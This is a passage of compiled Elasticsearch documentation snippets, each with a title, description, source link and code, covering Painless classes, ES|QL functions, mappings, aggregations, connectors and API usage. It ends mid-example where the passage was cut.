Enum in Java\nDESCRIPTION: The TextStyle enum represents styles for text formatting, including FULL, SHORT, and different standalone options. This allows date-time components to be displayed in various textual formats and supports both normal and standalone styles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.format.txt#2025-04-21_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.format.TextStyle {\n  TextStyle FULL\n  TextStyle FULL_STANDALONE\n  TextStyle NARROW\n  TextStyle NARROW_STANDALONE\n  TextStyle SHORT\n  TextStyle SHORT_STANDALONE\n  TextStyle asNormal()\n  TextStyle asStandalone()\n  boolean isStandalone()\n  TextStyle valueOf(String)\n  TextStyle[] values()\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Log Function with Base e in ESQL\nDESCRIPTION: This SQL query tests the natural logarithm function (base e) for various input values. It covers positive numbers, zero, and negative numbers, demonstrating the function's behavior and null handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/log.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    log(null::LONG) AS null_long,\n    log(null::DOUBLE) AS null_double,\n    log(null::INTEGER) AS null_integer,\n    log(1) AS one,\n    log(2.718281828459045) AS e,\n    log(7.389056098930650) AS e_squared,\n    log(0.3678794411714423) AS reciprocal_e,\n    log(0) AS zero,\n    log(-1) AS negative;\n```\n\n----------------------------------------\n\nTITLE: Defining DateTimeFormatter Class in Java\nDESCRIPTION: The DateTimeFormatter class provides various predefined formatters for date and time formatting in Java. It includes several methods for formatting and parsing date-time objects. The class also offers configuration options through different locales and styles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.format.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.format.DateTimeFormatter {\n  DateTimeFormatter BASIC_ISO_DATE\n  DateTimeFormatter ISO_DATE\n  DateTimeFormatter ISO_DATE_TIME\n  DateTimeFormatter ISO_INSTANT\n  DateTimeFormatter ISO_LOCAL_DATE\n  DateTimeFormatter ISO_LOCAL_DATE_TIME\n  DateTimeFormatter ISO_LOCAL_TIME\n  DateTimeFormatter ISO_OFFSET_DATE\n  DateTimeFormatter ISO_OFFSET_DATE_TIME\n  DateTimeFormatter ISO_OFFSET_TIME\n  DateTimeFormatter ISO_ORDINAL_DATE\n  DateTimeFormatter ISO_TIME\n  DateTimeFormatter ISO_WEEK_DATE\n  DateTimeFormatter ISO_ZONED_DATE_TIME\n  DateTimeFormatter RFC_1123_DATE_TIME\n  String format(TemporalAccessor)\n  void formatTo(TemporalAccessor,Appendable)\n  Chronology getChronology()\n  DecimalStyle getDecimalStyle()\n  Locale getLocale()\n  Set getResolverFields()\n  ResolverStyle getResolverStyle()\n  ZoneId getZone()\n  DateTimeFormatter ofLocalizedDate(FormatStyle)\n  DateTimeFormatter ofLocalizedDateTime(FormatStyle)\n  DateTimeFormatter ofLocalizedDateTime(FormatStyle,FormatStyle)\n  DateTimeFormatter ofLocalizedTime(FormatStyle)\n  DateTimeFormatter ofPattern(String)\n  DateTimeFormatter ofPattern(String,Locale)\n  TemporalAccessor parse(CharSequence)\n  def parse(CharSequence,TemporalQuery)\n  TemporalAccessor parseBest(CharSequence,TemporalQuery[])\n  TemporalQuery parsedExcessDays()\n  TemporalQuery parsedLeapSecond()\n  TemporalAccessor parseUnresolved(CharSequence,ParsePosition)\n  Format toFormat()\n  Format toFormat(TemporalQuery)\n  DateTimeFormatter withChronology(Chronology)\n  DateTimeFormatter withDecimalStyle(DecimalStyle)\n  DateTimeFormatter withLocale(Locale)\n  DateTimeFormatter withResolverFields(Set)\n  DateTimeFormatter withResolverStyle(ResolverStyle)\n  DateTimeFormatter withZone(ZoneId)\n}\n```\n\n----------------------------------------\n\nTITLE: Logging with Placeholders and Exceptions in Elasticsearch (Java)\nDESCRIPTION: Illustrates how to log messages with both placeholders and exceptions using a Supplier<String> and Strings.format in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_12\n\nLANGUAGE: java\nCODE:\n```\nlogger.debug(() -> Strings.format(\"failed at offset [%s]\", offset), exception);\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with a Keyword Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with a basic keyword field named 'tags' using the Elasticsearch API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/keyword.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"tags\": {\n        \"type\":  \"keyword\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Shard Allocation State Management\nDESCRIPTION: Code references for managing shard routing states and allocation tracking. The ShardRoutingState enumeration defines possible allocation states for shard copies, while RoutingTable and RoutingNodes track shard allocations across data nodes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/DistributedArchitectureGuide.md#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nShardRoutingState\nRoutingTable\nRoutingNodes\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types for ESQL Function Test Case in Markdown\nDESCRIPTION: This markdown table shows the supported field types and their corresponding result types for an ESQL function test case. All field types listed result in a boolean output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/predicates.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | boolean |\n| cartesian_point | boolean |\n| cartesian_shape | boolean |\n| date | boolean |\n| date_nanos | boolean |\n| double | boolean |\n| geo_point | boolean |\n| geo_shape | boolean |\n| integer | boolean |\n| ip | boolean |\n| keyword | boolean |\n| long | boolean |\n| text | boolean |\n| unsigned_long | boolean |\n| version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Simple Analyzer in Elasticsearch\nDESCRIPTION: Demonstrates how to make a POST request to Elasticsearch to analyze text using the simple analyzer. The simple analyzer tokenizes input by removing non-letter characters and converting text to lowercase. Supports processing arbitrary sentences into a list of letter-only tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-simple-analyzer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"analyzer\": \"simple\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Stempel Polish Analysis Plugin from Elasticsearch\nDESCRIPTION: Command to remove the Stempel Polish analysis plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-stempel.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove analysis-stempel\n```\n\n----------------------------------------\n\nTITLE: Configuring Object Fields with Subobjects Disabled in Elasticsearch\nDESCRIPTION: This example shows how to configure an object field with 'subobjects' set to false, allowing fields with dots in their names to be stored without creating intermediate objects. The example includes adding documents with both flat paths and as a single object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/subobjects.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"metrics\": {\n        \"type\":  \"object\",\n        \"subobjects\": false, <1>\n        \"properties\": {\n          \"time\": { \"type\": \"long\" },\n          \"time.min\": { \"type\": \"long\" },\n          \"time.max\": { \"type\": \"long\" }\n        }\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/metric_1\n{\n  \"metrics.time\" : 100, <2>\n  \"metrics.time.min\" : 10,\n  \"metrics.time.max\" : 900\n}\n\nPUT my-index-000001/_doc/metric_2\n{\n  \"metrics\" : {\n    \"time\" : 100, <3>\n    \"time.min\" : 10,\n    \"time.max\" : 900\n  }\n}\n\nGET my-index-000001/_mapping\n```\n\n----------------------------------------\n\nTITLE: Brics Automaton Copyright Notice\nDESCRIPTION: Copyright notice and license terms for Brics automaton code used in Lucene's automaton package\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-phonetic/licenses/lucene-LICENSE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright (c) 2001-2009 Anders Moeller\n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n * 3. The name of the author may not be used to endorse or promote products\n *    derived from this software without specific prior written permission.\n * \n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n```\n\n----------------------------------------\n\nTITLE: Basic DISSECT Usage Example in ESQL\nDESCRIPTION: An example of using DISSECT to parse a string containing a timestamp, text, and IP address. The specific example is referenced but not provided in the given text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/dissect.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\n// Example referenced but not provided in the text\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Connector with API\nDESCRIPTION: Elasticsearch API call to create a PostgreSQL connector instance. This specifies the connector name, target index, and service type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\nPUT _connector/my-connector-id\n{\n  \"name\": \"Music catalog\",\n  \"index_name\":  \"music\",\n  \"service_type\": \"postgresql\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Inference Endpoint for Rerank Task\nDESCRIPTION: Elasticsearch API call to create an inference endpoint for the rerank task using the uploaded model\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPUT _inference/rerank/my-msmarco-minilm-model\n{\n  \"service\": \"elasticsearch\",\n  \"service_settings\": {\n    \"num_allocations\": 1,\n    \"num_threads\": 1,\n    \"model_id\": \"cross-encoder__ms-marco-minilm-l-6-v2\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating API Key for Oracle Connector\nDESCRIPTION: This snippet shows how to create an API key for the Oracle connector using the Elasticsearch API. It includes the necessary role descriptors and privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-oracle.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining Full-Text Search with Path Hierarchy Filtering in Elasticsearch\nDESCRIPTION: This example combines a full-text match query for '16' with a filter on file paths that must be in Alice's directory, demonstrating how to use path hierarchy filtering with other search criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pathhierarchy-tokenizer.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET file-path-test/_search\n{\n  \"query\": {\n    \"bool\" : {\n      \"must\" : {\n        \"match\" : { \"file_path\" : \"16\" }\n      },\n      \"filter\": {\n        \"term\" : { \"file_path.tree\" : \"/User/alice\" }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Elasticsearch Client Benchmark with Gradle\nDESCRIPTION: Command to run the Elasticsearch client benchmark using Gradle. The command allows passing JMH parameters for customization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/benchmark/README.md#2025-04-21_snippet_0\n\nLANGUAGE: gradle\nCODE:\n```\n./gradlew -p client/benchmark run --args ' params go here'\n```\n\n----------------------------------------\n\nTITLE: With Runs Statement Example\nDESCRIPTION: Demonstrates using 'with runs' statement to run same event criteria multiple times in sequence.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_21\n\nLANGUAGE: eql\nCODE:\n```\nsequence\n  [ process where event.type == \"creation\" ]\n  [ library where process.name == \"regsvr32.exe\" ] with runs=3\n  [ registry where true ]\n```\n\n----------------------------------------\n\nTITLE: Handling Duplicate Values in Long Fields\nDESCRIPTION: Demonstrates that long fields do not remove duplicate values, unlike keyword fields. The example includes creating an index with a long field, indexing documents with duplicate values, and querying the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-multivalued-fields.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /mv\n{\n  \"mappings\": {\n    \"properties\": {\n      \"b\": {\"type\": \"long\"}\n    }\n  }\n}\n\nPOST /mv/_bulk?refresh\n{ \"index\" : {} }\n{ \"a\": 1, \"b\": [2, 2, 1] }\n{ \"index\" : {} }\n{ \"a\": 2, \"b\": [1, 1] }\n\nPOST /_query\n{\n  \"query\": \"FROM mv | LIMIT 2\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 28,\n  \"is_partial\": false,\n  \"columns\": [\n    { \"name\": \"a\", \"type\": \"long\"},\n    { \"name\": \"b\", \"type\": \"long\"}\n  ],\n  \"values\": [\n    [1, [1, 2, 2]],\n    [2,    [1, 1]]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Mapping Table\nDESCRIPTION: Table showing field type conversion mapping to date_nanos result type. Generated automatically by ESQL's AbstractFunctionTestCase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_date_nanos.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| date | date_nanos |\n| date_nanos | date_nanos |\n| double | date_nanos |\n| keyword | date_nanos |\n| long | date_nanos |\n| text | date_nanos |\n| unsigned_long | date_nanos |\n```\n\n----------------------------------------\n\nTITLE: Scoring with Asymmetric Similarity for Bit Vectors in Elasticsearch\nDESCRIPTION: Complex example showing how to create a bit vector index, insert documents with bit vectors, and score them using maxSimDotProduct similarity between a floating point query vector and the stored bit vectors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/rank-vectors.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT my-rank-vectors-bit\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_vector\": {\n        \"type\": \"rank_vectors\",\n        \"element_type\": \"bit\"\n      }\n    }\n  }\n}\n\nPOST /my-rank-vectors-bit/_bulk?refresh\n{\"index\": {\"_id\" : \"1\"}}\n{\"my_vector\": [127, -127, 0, 1, 42]}\n{\"index\": {\"_id\" : \"2\"}}\n{\"my_vector\": \"8100012a7f\"}\n\nGET my-rank-vectors-bit/_search\n{\n  \"query\": {\n    \"script_score\": {\n      \"query\": {\n        \"match_all\": {}\n      },\n      \"script\": {\n        \"source\": \"maxSimDotProduct(params.query_vector, 'my_vector')\",\n        \"params\": {\n          \"query_vector\": [\n            [0.35, 0.77, 0.95, 0.15, 0.11, 0.08, 0.58, 0.06, 0.44, 0.52, 0.21,\n       0.62, 0.65, 0.16, 0.64, 0.39, 0.93, 0.06, 0.93, 0.31, 0.92, 0.0,\n       0.66, 0.86, 0.92, 0.03, 0.81, 0.31, 0.2 , 0.92, 0.95, 0.64, 0.19,\n       0.26, 0.77, 0.64, 0.78, 0.32, 0.97, 0.84]\n           ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Bucket Correlation Aggregation Syntax in Elasticsearch\nDESCRIPTION: Shows the basic structure of a bucket_correlation aggregation that uses count_correlation function. This example demonstrates the minimal required configuration including buckets_path and function definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-correlation-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"bucket_correlation\": {\n    \"buckets_path\": \"range_values>_count\", <1>\n    \"function\": {\n      \"count_correlation\": { <2>\n        \"indicator\": {\n          \"expectations\": [...],\n          \"doc_count\": 10000\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Min Aggregation with Runtime Field in Elasticsearch\nDESCRIPTION: This example shows how to use a runtime field with the Min aggregation to calculate the minimum of a complex value derived from multiple fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-min-aggregation.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"price.adjusted\": {\n      \"type\": \"double\",\n      \"script\": \"\"\"\n        double price = doc['price'].value;\n        if (doc['promoted'].value) {\n          price *= 0.8;\n        }\n        emit(price);\n      \"\"\"\n    }\n  },\n  \"aggs\": {\n    \"min_price\": {\n      \"min\": { \"field\": \"price.adjusted\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Returning String with Spaces in ESQL\nDESCRIPTION: This snippet demonstrates the use of the SPACE function in ESQL, which generates a string composed of a specified number of spaces. The example shows concatenating two words 'Hello' and 'World!' with one space in between, effectively formatting the output string. The primary function used here is SPACE which accepts a numeric argument indicating the number of spaces to generate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/space.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = CONCAT(\"Hello\", SPACE(1), \"World!\");\n```\n\n----------------------------------------\n\nTITLE: Extracting documents with geohash geo_grid query\nDESCRIPTION: Demonstrates querying Elasticsearch using a geo_grid query to retrieve documents within a specific geohash bucket. This uses the GET method and specifies the geohash value to filter documents. The query returns documents that match the specified geohash.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-grid-query.md#2025-04-21_snippet_2\n\nLANGUAGE: Elasticsearch\nCODE:\n```\nGET /my_locations/_search\n{\n  \"query\": {\n    \"geo_grid\" :{\n      \"location\" : {\n        \"geohash\" : \"u0\"\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\n  \"took\" : 1,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : {\n      \"value\" : 1,\n      \"relation\" : \"eq\"\n    },\n    \"max_score\" : 1.0,\n    \"hits\" : [\n      {\n        \"_index\" : \"my_locations\",\n        \"_id\" : \"3\",\n        \"_score\" : 1.0,\n        \"_source\" : {\n          \"location\" : \"POINT(2.336389 48.861111)\",\n          \"city\" : \"Paris\",\n          \"name\" : \"Musée du Louvre\"\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Subqueries with Filtering and Ordering\nDESCRIPTION: Subqueries combining WHERE clauses, GROUP BY, and ORDER BY operations\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_subqueries_tests.txt#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT g as h FROM (\n    SELECT date AS f, int AS g FROM test\n) WHERE h IS NOT NULL\nGROUP BY h\nORDER BY h ASC;\n```\n\n----------------------------------------\n\nTITLE: Formatting Traceparent HTTP Header in Elasticsearch\nDESCRIPTION: Example of a traceparent HTTP header value and how it translates to a trace.id value in Elasticsearch logs, following the W3C trace context specification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/api-conventions.md#2025-04-21_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\n`traceparent`: 00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\n`trace.id`: 0af7651916cd43dd8448eb211c80319c\n```\n\n----------------------------------------\n\nTITLE: Adding a plugin extension to a deployment plan in Elasticsearch Service\nDESCRIPTION: JSON plan example showing how to include a plugin extension in an Elasticsearch deployment update operation. The extension is referenced by its ID in the user_plugins section.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"Extensions\",\n    \"prune_orphans\": false,\n    \"resources\": {\n        \"elasticsearch\": [\n            {\n                \"region\": \"gcp-us-central1\",\n                \"ref_id\": \"main-elasticsearch\",\n                \"plan\": {\n                    \"cluster_topology\": [\n\n                      ...\n\n                    ],\n                    \"elasticsearch\": {\n                        \"version\": \"8.4.3\",\n                        \"enabled_built_in_plugins\": [ ],\n                      \"user_bundles\": [\n                        {\n                          \"name\": \"custom-plugin\",\n                          \"url\": \"repo://2286113333\",\n                          \"elasticsearch_version\": \"8.4.3\"\n                        }\n                      ]\n                    },\n                    \"deployment_template\": {\n                        \"id\": \"gcp-storage-optimized-v3\"\n                    }\n                }\n            }\n        ]\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation for 'number' Parameter\nDESCRIPTION: Documentation of the 'number' parameter used in an ESQL function. The documentation appears to be empty or incomplete as no description is provided for the parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/sum.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`number`\n:   \n```\n\n----------------------------------------\n\nTITLE: High Accuracy Execution Query\nDESCRIPTION: Query showing how to enable high accuracy execution mode for TDigest algorithm at the cost of performance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"load_time_outlier\": {\n      \"percentiles\": {\n        \"field\": \"load_time\",\n        \"tdigest\": {\n          \"execution_hint\": \"high_accuracy\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Strings to Double Values using TO_DOUBLE in ESQL\nDESCRIPTION: Demonstrates converting string values to double type using TO_DOUBLE function. Shows successful conversions of numeric strings and handling of invalid string conversions that result in null values with warning headers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_double.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str1 = \"5.20128E11\", str2 = \"foo\"\n| EVAL dbl = TO_DOUBLE(\"520128000000\"), dbl1 = TO_DOUBLE(str1), dbl2 = TO_DOUBLE(str2)\n```\n\n----------------------------------------\n\nTITLE: Defining Query String Parameter in Markdown\nDESCRIPTION: This snippet defines the 'query' parameter for the Query String function. It specifies that the input should be in KQL (Kibana Query Language) query string format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/kql.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`query`\n:   Query string in KQL query string format.\n```\n\n----------------------------------------\n\nTITLE: Selecting Employee Data with ESQL\nDESCRIPTION: This ESQL query selects all columns from the 'employees' table, specifically keeping columns that start with 'h' and all other columns. It demonstrates the use of the KEEP clause in ESQL for column selection.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/keepDoubleWildcard.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP h*, *\n```\n\n----------------------------------------\n\nTITLE: Using ATAN2 Function in ESQL\nDESCRIPTION: Demonstrates how to use the ATAN2 function in ESQL to calculate the arctangent of y/x. The function takes two parameters: y and x, and returns the angle in radians.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/atan2.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW y=12.9, x=.6\n| EVAL atan2=ATAN2(y, x)\n```\n\n----------------------------------------\n\nTITLE: Index Query Cache Enable Setting\nDESCRIPTION: Index-level setting to control whether query caching is enabled for a specific index\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/node-query-cache-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nindex.queries.cache.enabled\n```\n\n----------------------------------------\n\nTITLE: Response showing document with custom character limit\nDESCRIPTION: Response showing the extracted properties with a custom limit of 5 characters for the content field as specified in the max_size field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_11\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"found\": true,\n  \"_index\": \"my-index-000001\",\n  \"_id\": \"my_id_2\",\n  \"_version\": 1,\n  \"_seq_no\": 40,\n  \"_primary_term\": 1,\n  \"_source\": {\n    \"max_size\": 5,\n    \"attachment\": {\n      \"content_type\": \"application/rtf\",\n      \"language\": \"sl\",\n      \"content\": \"Lorem\",\n      \"content_length\": 5\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Regex Capture Groups for Replacement in Painless\nDESCRIPTION: Demonstrates using regex capture groups ($1) for replacements in Painless by replacing 'n' followed by a vowel with just the vowel.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nPOST hockey/_update_by_query\n{\n  \"script\": {\n    \"lang\": \"painless\",\n    \"source\": \"ctx._source.last = /n([aeiou])/.matcher(ctx._source.last).replaceAll('$1')\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Metadata in Elasticsearch Index Mapping\nDESCRIPTION: This snippet demonstrates how to set custom metadata using the _meta field when creating an Elasticsearch index. The _meta field can store application-specific information such as class names and version ranges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-meta-field.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"_meta\": { \n      \"class\": \"MyApp::User\",\n      \"version\": {\n        \"min\": \"1.0\",\n        \"max\": \"1.3\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running End-to-End Tests for Redis Connector\nDESCRIPTION: Shell commands to run functional tests for the Redis connector using Docker Compose, with options for different data sizes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_10\n\nLANGUAGE: sh\nCODE:\n```\n$ make ftest NAME=redis\n```\n\nLANGUAGE: sh\nCODE:\n```\nmake ftest NAME=redis DATA_SIZE=small\n```\n\n----------------------------------------\n\nTITLE: ESQL String Reversal Function Documentation\nDESCRIPTION: Function documentation comment indicating that this is an auto-generated test case file for ESQL's AbstractFunctionTestCase. The function returns a new string with characters in reverse order from the input string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/reverse.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Date Histogram Offset Result Example\nDESCRIPTION: Shows the response from the date histogram with offset example. The documents are grouped into buckets starting at 6am instead of midnight, demonstrating how the offset parameter works.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"my_buckets\": {\n      \"after_key\": { \"date\": \"2015-10-01T06:00:00.000Z\" },\n      \"buckets\": [\n        {\n          \"key\": { \"date\": 